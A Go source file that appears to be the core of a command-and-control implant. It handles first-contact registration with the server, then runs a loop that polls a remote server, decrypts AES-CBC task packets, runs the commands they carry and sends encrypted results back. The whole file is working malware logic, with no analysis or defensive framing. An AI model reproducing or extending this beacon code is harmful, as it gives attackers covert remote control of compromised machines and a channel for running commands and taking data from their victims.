package internal

import (
	"belin/config"
	"belin/encrypt"
	"belin/metadata"
	"belin/requester"
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"log"
	"time"
)

func Init() error {
	enc, err := encrypt.New(config.RSAPUB, config.RSAPRV)
	if err != nil {
		return err
	}

	mt := metadata.New()
	log.Printf("client Id %d", mt.ClientId)

	req := requester.New(int(mt.ClientId))

	b, err := firstBlood(enc, mt, &req)
	if err != nil {
		return err
	}

	if !b {
		return errors.New("firstblood not reached")
	}

	log.Printf("firstblood ok")
	time.Sleep(time.Duration(config.SLEP))
	return handler(enc, mt, &req)
}

/*
handler handles the communication.
*/
func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) error {
	for {
		resp, err := callTask(mt, r)
		if err != nil {
			return err
		}
		log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)

		if resp.ContentLength > 0 {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return err
			}

			//hmacData := body[resp.ContentLength-encrypt.HmacHashLen:]
			data := body[:resp.ContentLength-encrypt.HmacHashLen]
			tasks, err := enc.AesCBCDecrypt(data, enc.AesKey)
			if err != nil {
				return err
			}

			//timestamp := tasks[:4]
			lenDataB := tasks[4:8]
			lenData := binary.BigEndian.Uint32(lenDataB)
			tasksBuf := bytes.NewBuffer(tasks[8:])

			for {
				if lenData <= 0 {
					break
				}
				cmdType, data, err := metadata.ParseTask(tasksBuf, &lenData)
				if err != nil {
					return err
				}

				rtype,resp := Task(cmdType, data)
				pack, err := metadata.PackResp(enc, int(rtype), resp)
				if err != nil {return err}

				postResp, err := sendResult(r, pack)
				if err != nil {return err}
				
				log.Printf("data sent url=%s st=%d cl=%d\n", 
					postResp.Request.URL, postResp.StatusCode, postResp.ContentLength)
			}

		}

		time.Sleep(time.Duration(config.SLEP) * time.Millisecond)
	}
}
